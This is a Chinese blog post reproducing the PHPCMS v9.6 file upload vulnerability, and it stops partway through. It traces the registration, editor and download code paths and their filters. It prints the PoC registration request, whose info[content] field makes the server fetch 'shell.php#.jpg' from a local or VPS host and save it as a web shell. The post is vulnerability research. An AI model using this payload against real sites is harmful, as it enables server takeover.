@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>phpcmsv9文件上传漏洞[复现] | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class="logo" href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id="post">
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>phpcmsv9文件上传漏洞[复现]</h1>
+          <div class="post-meta">
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/07/19</time>
+            
+            
+          </div>
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9<br>ubuntu19<br>mysql+php5.6</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷<br>然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，现在还在学习使用，这次的复现，debug起到至关重要的作用。<br>然后有一个要命的地方，函数的操作和数据库之间的联系，我发现我没有很好的联系在一起。</p>
+<h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>由于过滤的不当，使得文件可以绕过后缀限制，实现文件上传。</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="触发点追溯"><a href="#触发点追溯" class="headerlink" title="触发点追溯"></a>触发点追溯</h2><p>路由就不介绍了…..<br>看过POC，其中payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=member&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br><span class="line">POST:siteid=<span class="number">1</span>&amp;modelid=<span class="number">11</span>&amp;username=<span class="number">123456</span>&amp;password=<span class="number">123456</span>&amp;email=<span class="number">123456</span>@qq.com&amp;info[content]=&lt;img src=http:<span class="comment">//127.0.0.1/shell.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span></span><br></pre></td></tr></table></figure></p>
+<p>根据地址，问题出在phpcms/modules/member/index.php::register()<br>找到它的位置….<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_session_start();</span><br><span class="line">		<span class="comment">//获取用户siteid</span></span><br><span class="line">		$siteid = <span class="keyword">isset</span>($_REQUEST[<span class="string">'siteid'</span>]) &amp;&amp; trim($_REQUEST[<span class="string">'siteid'</span>]) ? intval($_REQUEST[<span class="string">'siteid'</span>]) : <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//定义站点id常量</span></span><br><span class="line">		<span class="keyword">if</span> (!defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">		   define(<span class="string">'SITEID'</span>, $siteid);</span><br><span class="line">		&#125;</span><br><span class="line">		... ...</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>($member_setting[<span class="string">'enablcodecheck'</span>]==<span class="string">'1'</span>)&#123;<span class="comment">//开启验证码</span></span><br><span class="line">				<span class="keyword">if</span> ((<span class="keyword">empty</span>($_SESSION[<span class="string">'connectid'</span>]) &amp;&amp; $_SESSION[<span class="string">'code'</span>] != strtolower($_POST[<span class="string">'code'</span>]) &amp;&amp; $_POST[<span class="string">'code'</span>]!==<span class="keyword">NULL</span>) || <span class="keyword">empty</span>($_SESSION[<span class="string">'code'</span>])) &#123;</span><br><span class="line">					showmessage(L(<span class="string">'code_error'</span>));</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					$_SESSION[<span class="string">'code'</span>] = <span class="string">''</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			$userinfo = <span class="keyword">array</span>();</span><br><span class="line">			$userinfo[<span class="string">'encrypt'</span>] = create_randomstr(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">			$userinfo[<span class="string">'username'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; is_username($_POST[<span class="string">'username'</span>])) ? $_POST[<span class="string">'username'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">			$userinfo[<span class="string">'nickname'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'nickname'</span>]) &amp;&amp; is_username($_POST[<span class="string">'nickname'</span>])) ? $_POST[<span class="string">'nickname'</span>] : <span class="string">''</span>;</span><br><span class="line">			</span><br><span class="line">			$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">			$userinfo[<span class="string">'password'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; is_badword($_POST[<span class="string">'password'</span>])==<span class="keyword">false</span>) ? $_POST[<span class="string">'password'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">			</span><br><span class="line">			$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line"></span><br><span class="line">			$userinfo[<span class="string">'modelid'</span>] = <span class="keyword">isset</span>($_POST[<span class="string">'modelid'</span>]) ? intval($_POST[<span class="string">'modelid'</span>]) : <span class="number">10</span>;</span><br><span class="line">			$userinfo[<span class="string">'regip'</span>] = ip();</span><br><span class="line">			$userinfo[<span class="string">'point'</span>] = $member_setting[<span class="string">'defualtpoint'</span>] ? $member_setting[<span class="string">'defualtpoint'</span>] : <span class="number">0</span>;</span><br><span class="line">			$userinfo[<span class="string">'amount'</span>] = $member_setting[<span class="string">'defualtamount'</span>] ? $member_setting[<span class="string">'defualtamount'</span>] : <span class="number">0</span>;</span><br><span class="line">			$userinfo[<span class="string">'regdate'</span>] = $userinfo[<span class="string">'lastdate'</span>] = SYS_TIME;</span><br><span class="line">			$userinfo[<span class="string">'siteid'</span>] = $siteid;</span><br><span class="line">			$userinfo[<span class="string">'connectid'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'connectid'</span>]) ? $_SESSION[<span class="string">'connectid'</span>] : <span class="string">''</span>;</span><br><span class="line">			$userinfo[<span class="string">'from'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'from'</span>]) ? $_SESSION[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br><span class="line">			<span class="comment">//手机强制验证</span></span><br><span class="line">            ... ...</span><br><span class="line">            ... ...</span><br><span class="line">            	<span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">				<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">		        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">				$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</span><br><span class="line">				$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">				$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</span><br><span class="line">			&#125;</span><br><span class="line">            ... ...</span><br><span class="line">            ... ...</span><br></pre></td></tr></table></figure></p>
+<p>中间的代码太长了，自行看源码吧….其间的很多代码是一个验证的过程，根据传入参数的需要，其实和本漏洞都没有太大的关系，通过debug可以很快速的过掉这些无用代码….话是这么说，但是我debug并没有用的特别熟练。<br>还是像之前那样，先看看构造函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::__construct();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;http_user_agent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个发现好像没啥问题，就是继承了父类，直接看该函数，先对siteid和dosubmit进行验证，然后我们输入用户信息，实际上通过浏览器访问该地址实际上就就是一个注册过程。(这里插一句，就是在分析的过程中可能会遇到函数不懂作用的,然后一路手动跟着跑，跑到最后，看到懵逼的那种….所以我们要善于使用debug,一些不懂如何使用的函数，可以借助debug)<br>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>跟进函数get()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;<span class="comment">//$_POST['info']</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">		$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">		$info = <span class="keyword">array</span>();</span><br><span class="line">		$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line">		<span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line">				<span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">				$field = safe_replace($field);</span><br><span class="line">				$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">				$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">				$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">				$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">				$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">				$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line">				<span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line">				<span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line">				<span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">					showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					str_cut($value, $maxlength);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">	            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">				$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line">				<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line">	</span><br><span class="line">				$info[$field] = $value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $info;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先不考虑过滤的问题先找到是什么触发了漏洞（主要是考虑到过滤的问题，我发现我巨菜…..）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure></p>
+<p>这里的$func在debug下，会跳转到editor()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">	$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">	$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">	$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">	$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">	$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>一看到download()毫不犹豫的跟进download()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;upload_func = <span class="string">'copy'</span>;</span><br><span class="line">   ... ...</span><br><span class="line">   ... ...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $image_d;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">	$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">	$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">	$uploadpath = $upload_url.$dir;</span><br><span class="line">	$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">	$string = new_stripslashes($value);</span><br><span class="line">	<span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">	$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		dir_create($uploaddir);</span><br><span class="line">		$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>($matches, $string);</span><br><span class="line">	$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">	$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		$filename = fileext($file);</span><br><span class="line">		$file_name = basename($file);</span><br><span class="line">		$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">		$newfile = $uploaddir.$filename;</span><br><span class="line">		$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">		<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">			$oldpath[] = $k;</span><br><span class="line">			$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">			@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">			$fileext = fileext($filename);</span><br><span class="line">			<span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">				watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">			&#125;</span><br><span class="line">			$filepath = $dir.$filename;</span><br><span class="line">			$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">			$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">			<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">				$oldpath[] = $k;</span><br><span class="line">				$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">				@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">				$fileext = fileext($filename);</span><br><span class="line">				<span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">					watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">				&#125;</span><br><span class="line">				$filepath = $dir.$filename;</span><br><span class="line">				$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">				$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
+<p>验证，创建路径给路径权限，创建新文件，将上传内容写入新文件，返回新文件的路径，上传文件成功。(这里我是根据POC，一路debug的，基本就是把作者的思路走了一遍….好菜啊，都没有自己的想法)</p>
+<h2 id="考虑过滤"><a href="#考虑过滤" class="headerlink" title="考虑过滤"></a>考虑过滤</h2><p>作者给的payload中的<strong>$info[‘content’]=<img src="http://vps/shell.php#.jpg"></strong><br>这个让我想起之前神盾杯的时候，锚点过滤的一道题，参考<a href="http://mochazz.github.io" target="_blank" rel="noopener">学长的博客中神盾杯那篇</a><br>分析一下，为啥这里可以使用’#’<br>定位：modules/member/index.php::register() 137行<br>register()函数中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>])</span><br></pre></td></tr></table></figure></p>
+<p>跟进函数new_html_special_chars()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line"> * 返回经htmlspecialchars处理过的字符串或数组</span><br><span class="line"> * @param $obj 需要处理的字符串或数组</span><br><span class="line"> * @<span class="keyword">return</span> mixed</span><br><span class="line"> */</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_html_special_chars</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$encoding = <span class="string">'utf-8'</span>;</span><br><span class="line">	<span class="keyword">if</span>(strtolower(CHARSET)==<span class="string">'gbk'</span>) $encoding = <span class="string">'ISO-8859-15'</span>;</span><br><span class="line">	<span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> htmlspecialchars($string,ENT_QUOTES,$encoding);</span><br><span class="line">	<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中的htmlspecialchars()，用于防止xss攻击<br><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/1.png" alt=""></p>
+<p>定位caches/caches_model/caches_data/member_input.class.php::get() 30行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$field = safe_replace($field);</span><br></pre></td></tr></table></figure></p>
+<p>跟进safe_replace()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 安全过滤函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后来到download()函数，位于phpcms/libs/classes/attachment.class.php::download() 152行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$string = new_stripslashes($value);</span><br></pre></td></tr></table></figure></p>
